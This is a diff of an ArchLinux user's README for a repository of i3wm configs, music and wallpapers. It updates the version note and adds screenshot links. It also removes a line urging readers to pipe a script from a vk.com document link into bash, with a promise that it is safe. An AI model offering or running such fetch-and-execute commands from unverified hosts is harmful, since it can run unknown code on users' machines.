@@ -6,17 +6,14 @@ A repository of ArchLinux user's configs.
 
 In this repository you can find
 
-* My i3wm configuration files (Current version 2.0 from 11.10.2015) with
- * 11 Windows thenes
- * 14 Bar themes
- * 6 Dmenu themes
+* My i3wm configuration files (Current version 2.3 from 15.05.2016)
  
 * My favorite music MP3 Files
 
 * My favorite wallpapers 16:9
  * To download one, open it, right clicl on image, press "Save as..."
 
-To see what I can, do this comand in terminal from user:
- $ curl -s http://vk.com/doc333664467_437145013 | bash
-
-I guarant you that it can't be dangerous for you, but if you afraid to do this, nobody makes you do this.
+Screenshots:
+![alt tag](https://github.com/kuzuka/dmitry_babaycev/blob/master/clean.png)
+![alt tag](https://github.com/kuzuka/dmitry_babaycev/blob/master/screenfetch.png)
+![alt tag](https://github.com/kuzuka/dmitry_babaycev/blob/master/terminal.png)
